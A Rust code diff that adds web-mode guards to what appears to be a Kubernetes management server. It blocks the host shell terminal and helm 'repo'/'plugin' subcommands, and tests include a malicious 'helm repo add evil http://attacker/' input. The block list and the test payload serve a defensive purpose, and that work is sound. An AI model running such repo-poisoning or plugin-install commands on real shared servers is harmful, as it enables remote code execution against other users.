@@ -23,6 +23,34 @@ fn error(status: StatusCode, message: &str) -> Response {
     (status, Json(json!({ "error": message }))).into_response()
 }
 
+/// Streaming commands with no safe multi-user form on the shared web server.
+/// `start_terminal` spawns a shell on the container host (not a pod) with the
+/// server's own environment — any authenticated user would get code execution
+/// as the shared UID and could read every other user's materialized
+/// kubeconfigs and sealed tokens. Web users get the RBAC-scoped in-pod
+/// `start_pod_exec` terminal instead; the host shell stays desktop-only.
+pub const WEB_DENIED_COMMANDS: &[&str] = &["start_terminal"];
+
+/// Helm subcommands with no safe multi-user form on the shared server:
+/// `plugin install <url>` downloads and runs code (RCE as the shared UID) and
+/// `repo add`/`repo update` write shared repository state a later helmInstall
+/// would trust. The other operations (install/upgrade/rollback/uninstall/
+/// template/list/get/…) stay allowed and run against per-user `HELM_*` dirs.
+pub const HELM_DENIED_SUBCOMMANDS: &[&str] = &["repo", "plugin"];
+
+/// True if a helm arg vector must be refused on the web surface. The web UI
+/// always sends the subcommand as the first token, so that token is the
+/// subcommand helm will run. A leading flag (which the UI never sends) is
+/// refused too: `helm --flag repo add …` would otherwise run `repo add` while
+/// slipping past a first-token check.
+pub fn helm_args_denied(args: &[String]) -> bool {
+    match args.first().map(String::as_str) {
+        Some(first) if first.starts_with('-') => true,
+        Some(first) => HELM_DENIED_SUBCOMMANDS.contains(&first),
+        None => false,
+    }
+}
+
 /// Map a stream-start error to a response: a cluster-login-required marker (the
 /// context is OIDC-protected with no valid token) becomes a 401 the frontend
 /// can act on; anything else is a 502 (cluster unreachable, RBAC, etc.).
@@ -54,6 +82,10 @@ pub async fn dispatch(
     Path(command): Path<String>,
     body: axum::body::Bytes,
 ) -> Response {
+    if WEB_DENIED_COMMANDS.contains(&command.as_str()) {
+        return error(StatusCode::FORBIDDEN, "command not available in web mode");
+    }
+
     let args: Value = if body.is_empty() {
         json!({})
     } else {
@@ -310,10 +342,24 @@ async fn run(
         }
         "start_helm_op" => {
             let a: HelmStart = parse(body)?;
+            if helm_args_denied(&a.args) {
+                return Err(error(
+                    StatusCode::FORBIDDEN,
+                    "helm repo/plugin operations are not available in web mode",
+                ));
+            }
             let id = env
                 .streams
                 .helm
-                .start(sink(), a.context, paths, a.args, a.values, a.channel)
+                .start(
+                    sink(),
+                    a.context,
+                    paths,
+                    a.args,
+                    a.values,
+                    a.channel,
+                    Some(env.helm_home.clone()),
+                )
                 .await
                 .map_err(|e| command_error(&e))?;
             json!(id)
@@ -335,6 +381,7 @@ async fn run(
 
 #[cfg(test)]
 mod tests {
+    use super::helm_args_denied;
     use crate::{router, AppState};
     use axum::body::Body;
     use axum::http::{Request, StatusCode};
@@ -427,6 +474,69 @@ mod tests {
         assert!(
             body.is_number(),
             "exec session id must be a bare number (desktop parity), got {body}"
+        );
+    }
+
+    #[tokio::test]
+    async fn host_terminal_is_denied_in_web_mode() {
+        // The host shell has no safe shared-UID form; web users get the in-pod
+        // exec terminal instead. The deny must short-circuit with 403 before the
+        // command ever spawns a shell.
+        let state = AppState::for_tests(Arc::new(Registry::new())).await;
+        let (status, body) = authed_post(
+            &state,
+            "start_terminal",
+            json!({ "context": "c", "channel": "term:1" }),
+        )
+        .await;
+        assert_eq!(status, StatusCode::FORBIDDEN);
+        assert_eq!(body["error"], json!("command not available in web mode"));
+    }
+
+    #[test]
+    fn helm_guard_blocks_repo_plugin_and_leading_flags_only() {
+        // Denied: repo/plugin subcommands, and any leading flag (an evasion the
+        // UI never emits — `--flag repo add` would slip a denied subcommand
+        // past a first-token check).
+        for args in [
+            vec!["repo".into(), "add".into(), "x".into(), "http://e".into()],
+            vec!["plugin".into(), "install".into(), "http://e".into()],
+            vec!["--namespace".into(), "x".into(), "repo".into(), "add".into()],
+        ] {
+            assert!(helm_args_denied(&args), "must deny: {args:?}");
+        }
+        // Allowed: the operations the UI actually sends, all subcommand-first.
+        for args in [
+            vec!["install".into(), "r".into(), "c".into()],
+            vec!["upgrade".into(), "r".into(), "c".into()],
+            vec!["rollback".into(), "r".into(), "1".into()],
+            vec!["uninstall".into(), "r".into()],
+            vec![], // `helm` with no args just prints help
+        ] {
+            assert!(!helm_args_denied(&args), "must allow: {args:?}");
+        }
+    }
+
+    #[tokio::test]
+    async fn helm_repo_op_is_denied_in_web_mode() {
+        // A malicious `helm repo add` (shared-repo poisoning) must be refused
+        // with 403 before the helm subprocess ever spawns.
+        let state = AppState::for_tests(Arc::new(Registry::new())).await;
+        let (status, body) = authed_post(
+            &state,
+            "start_helm_op",
+            json!({
+                "context": "c",
+                "args": ["repo", "add", "evil", "http://attacker/"],
+                "values": "",
+                "channel": "helm:1"
+            }),
+        )
+        .await;
+        assert_eq!(status, StatusCode::FORBIDDEN);
+        assert_eq!(
+            body["error"],
+            json!("helm repo/plugin operations are not available in web mode")
         );
     }
 
